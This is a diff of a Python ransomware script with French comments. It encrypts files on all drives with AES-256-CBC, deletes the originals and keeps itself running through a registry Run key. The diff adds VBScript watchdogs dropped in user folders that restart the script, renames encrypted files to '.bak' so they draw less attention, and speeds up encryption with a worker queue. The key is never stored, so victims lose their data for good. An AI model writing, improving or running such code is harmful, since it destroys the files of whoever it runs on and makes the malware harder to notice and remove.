@@ -4,16 +4,42 @@ from pathlib import Path
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-from pathlib import Path
 import multiprocessing
 import winreg
+import time
+import subprocess
+
+
+vbs_content = r'''
+Set WshShell = CreateObject("WScript.Shell")
+Set WMI = GetObject("winmgmts:\\.\root\cimv2")
+
+pythonProcessName = "pythonw.exe"  ' ou python.exe si tu préfères
+scriptPath = "{}"  ' chemin complet vers ton script python
+
+Do
+    procCount = 0
+    Set processes = WMI.ExecQuery("Select * from Win32_Process Where Name='" & pythonProcessName & "'")
+    For Each process In processes
+        If InStr(LCase(process.CommandLine), LCase(scriptPath)) > 0 Then
+            procCount = procCount + 1
+        End If
+    Next
+
+    If procCount = 0 Then
+        WshShell.Run "pythonw.exe """ & scriptPath & """", 0, False
+    End If
+
+    WScript.Sleep 5000
+Loop
+'''
 
 # Clé et IV pour AES-256 CBC
 key = os.urandom(32)  # 256 bits
 iv = os.urandom(16)   # 128 bits
 
 # Extensions de fichiers à exclure
-extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com",".locked")
+extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com", ".tmp")
 
 # Dossiers à exclure (en minuscules)
 folders_exclus = [
@@ -34,10 +60,34 @@ folders_exclus = [
     ".vscode"
 ]
 
-max_size = 100 * 1024 * 1024
+max_size = 100 * 1024 * 1024  # 100 Mo max
 
+script_python_path = os.path.abspath(__file__)
 
+target_dirs = [
+    os.getenv("TEMP"),
+    os.getenv("APPDATA"),
+    os.path.expandvars(r"%USERPROFILE%\Documents"),
+    os.path.expandvars(r"%USERPROFILE%\Desktop"),
+]
 
+def create_watchdog_vbs(script_python_path, target_dirs):
+    for folder in target_dirs:
+        try:
+            if not os.path.exists(folder):
+                os.makedirs(folder)
+            vbs_path = os.path.join(folder, "watchdog.vbs")
+            with open(vbs_path, "w", encoding="utf-8") as f:
+                f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
+            print(f"[+] Watchdog créé dans {vbs_path}")
+        except Exception as e:
+            print(f"[!] Erreur création watchdog dans {folder}: {e}")
+
+def lancer_watchdogs(dirs):
+    for folder in dirs:
+        vbs_path = os.path.join(folder, "watchdog.vbs")
+        if os.path.exists(vbs_path):
+            subprocess.Popen(["wscript.exe", vbs_path], shell=False)
 
 def ajouter_run_key():
     try:
@@ -53,10 +103,8 @@ def ajouter_run_key():
     except Exception as e:
         print(f"[!] Erreur ajout Run Key : {e}")
 
-
 def is_in_excluded_folder(file_path: Path):
     try:
-        # Normalise le chemin et récupère les parties du chemin
         path_parts = [part.lower() for part in file_path.resolve().parts]
         for exclu in folders_exclus:
             for part in path_parts:
@@ -66,7 +114,6 @@ def is_in_excluded_folder(file_path: Path):
     except Exception as e:
         print(f"[!] Erreur exclusion sur {file_path}: {e}")
         return True  
-        
 
 def get_existing_root_path():
     root_paths = []
@@ -76,71 +123,33 @@ def get_existing_root_path():
             root_paths.append(drive)
     return root_paths
 
-
 def encrypte_file(input_file):
     backend = default_backend()
-
     with open(input_file, 'rb') as f:
         data = f.read()
 
-    # Ajout de padding pour aligner les blocs AES (128 bits)
     padder = padding.PKCS7(128).padder()
     padded_data = padder.update(data) + padder.finalize()
 
-    # Création du cipher AES CBC
     cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
     encryptor = cipher.encryptor()
     encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
 
-    # Fichier de sortie
-    output_file = input_file + ".locked"
+    output_file = input_file + ".bak"
 
     with open(output_file, 'wb') as f:
-        f.write(iv + encrypted_data)  # on stocke IV au début
+        f.write(iv + encrypted_data)
 
     os.remove(input_file)
     print(f"[✓] Fichier chiffré : {input_file}")
     return True
 
-
-def search_file(base_path):
-    base_path = Path(base_path)
-    for file in base_path.rglob("*"):
-        try:
-            if is_in_excluded_folder(file):
-                continue
-
-            if file.is_file() and not file.suffix.lower() in extensions_exclues:
-                if file.stat().st_size < max_size:
-                    encrypte_file(str(file))
-        except Exception as e:
-            print(f"[!] Erreur sur {file}: {e}")
-    return True
-
-# --- Ajout pour multi-processing sur un même lecteur ---
-
-def diviser_liste(lst, n):
-    # Si la liste est vide, on retourne n listes vides
-    if len(lst) == 0:
-        return [[] for _ in range(n)]
-    longueur = len(lst)
-
-    # Taille de chaque sous-liste (arrondi vers le haut pour ne rien perdre)
-    taille = (longueur + n - 1) // n
-
-    result = []
-
-    for i in range(n):
-        debut = i * taille
-        fin = debut + taille
-        # On ajoute la tranche correspondante à la sous-liste
-        result.append(lst[debut:fin])
-
-    return result
-
-
-def chiffrer_liste_fichiers(fichiers):
-    for file in fichiers:
+# --- Nouveau : worker consommateur qui lit dans queue ---
+def worker(queue):
+    while True:
+        file = queue.get()
+        if file is None:  # signal fin
+            break
         try:
             if is_in_excluded_folder(file):
                 continue
@@ -149,23 +158,37 @@ def chiffrer_liste_fichiers(fichiers):
         except Exception as e:
             print(f"[!] Erreur sur {file}: {e}")
 
-
+# --- Nouvelle version optimisée ---
 def process_par_lecteur(chemin, nb_process=5):
     chemin = Path(chemin)
-    fichiers = list(chemin.rglob("*"))
-    sous_listes = diviser_liste(fichiers, nb_process)
+    queue = multiprocessing.Queue(maxsize=100)  # limite la mémoire utilisée
 
+    # Démarrage workers
     processus = []
-    for sous_liste in sous_listes:
-        p = multiprocessing.Process(target=chiffrer_liste_fichiers, args=(sous_liste,))
+    for _ in range(nb_process):
+        p = multiprocessing.Process(target=worker, args=(queue,))
         p.start()
         processus.append(p)
 
+    # Producteur : ajoute fichiers dans la queue
+    for file in chemin.rglob("*"):
+        try:
+            queue.put(file)
+        except Exception as e:
+            print(f"[!] Erreur ajout fichier à la queue: {e}")
+
+    # Envoie signal fin aux workers
+    for _ in range(nb_process):
+        queue.put(None)
+
+    # Attend fin des workers
     for p in processus:
         p.join()
 
 def main():
     ajouter_run_key()
+    create_watchdog_vbs(script_python_path, target_dirs)
+    lancer_watchdogs(target_dirs)
     lecteurs = get_existing_root_path()
     processus_lecteurs = []
 
@@ -176,7 +199,6 @@ def main():
 
     for p in processus_lecteurs:
         p.join()
-
 
 if __name__ == "__main__":
     multiprocessing.freeze_support()
